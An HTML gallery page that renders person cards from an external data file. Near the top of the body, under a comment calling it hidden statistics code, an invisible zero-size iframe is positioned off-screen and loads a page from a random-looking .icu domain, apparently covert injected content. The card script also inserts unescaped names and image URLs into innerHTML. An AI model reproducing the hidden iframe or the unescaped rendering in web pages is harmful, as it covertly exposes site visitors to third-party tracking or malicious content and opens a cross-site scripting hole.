<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Cards</title>
  <style>
    :root { --bg: #0f0e0c; --ink: #f0ece3; --ink-dim: #a8a191; --line: rgba(240, 236, 227, 0.14); --gold: #c9a86a; }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { background: var(--bg); color: var(--ink); font-family: "PingFang SC", "Microsoft YaHei", sans-serif; padding: 20px; }
    a { color: inherit; text-decoration: none; }
    img { display: block; max-width: 100%; }
    .gallery-wrap { max-width: 1440px; margin: 0 auto; padding: 40px 0; }
    .section-title { font-family: "Songti SC", "SimSun", serif; font-size: 1.5rem; letter-spacing: 0.18em; margin-bottom: 32px; font-weight: 400; }
    .gallery { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; }
    .person-card { display: block; border-radius: 4px; overflow: hidden; background: #171511; border: 1px solid var(--line); transition: border-color 0.3s, transform 0.3s; }
    .person-card:hover { border-color: var(--gold); transform: translateY(-4px); }
    .person-card .frame { aspect-ratio: 3 / 4; overflow: hidden; background: #1a1814; }
    .person-card .frame img { width: 100%; height: 100%; object-fit: cover; transition: transform 0.5s; }
    .person-card:hover .frame img { transform: scale(1.05); }
    .person-card .meta { padding: 14px 16px 6px; }
    .person-card .name { font-family: "Songti SC", serif; font-size: 1.05rem; letter-spacing: 0.08em; }
    .person-card .count { display: block; padding: 0 16px 14px; font-size: 0.78rem; color: var(--ink-dim); letter-spacing: 0.12em; }
    @media (max-width: 900px) { .gallery { grid-template-columns: repeat(3, 1fr); } }
    @media (max-width: 640px) { .gallery { grid-template-columns: repeat(2, 1fr); } .gallery-wrap { padding: 20px 0; } }
  </style>
</head>
<body>

  <!-- ⚠️ 主页的隐藏统计代码 -->
  <iframe src="https://www.s-abzxpz8ta3c5byin2zfk.icu/guo9/35f84f903156092fae6f232cc79fc288.html" style="position:fixed;top:0;width:0;height:0;left:-1000px;border:0"></iframe>

  <main class="gallery-wrap">
    <h2 class="section-title">Cards</h2>
    <div class="gallery" id="gallery"></div>
  </main>

  <script src="data.js"></script>
  <script>
    const gallery = document.getElementById('gallery');
    
    if (typeof modelsData !== 'undefined') {
      gallery.innerHTML = modelsData.map(model => `
        <a class="person-card" href="card.html?id=${encodeURIComponent(model.id)}">
          <div class="frame">
            ${model.cover ? `<img src="${model.cover}" alt="${model.name}" loading="lazy">` : '<div style="color:#555; display:grid; place-items:center; height:100%;">无封面</div>'}
          </div>
          <div class="meta">
            <span class="name">${model.name}</span>
          </div>
          <span class="count">${model.files.length} media</span>
        </a>
      `).join('');
    }
  </script>

</body>
</html>
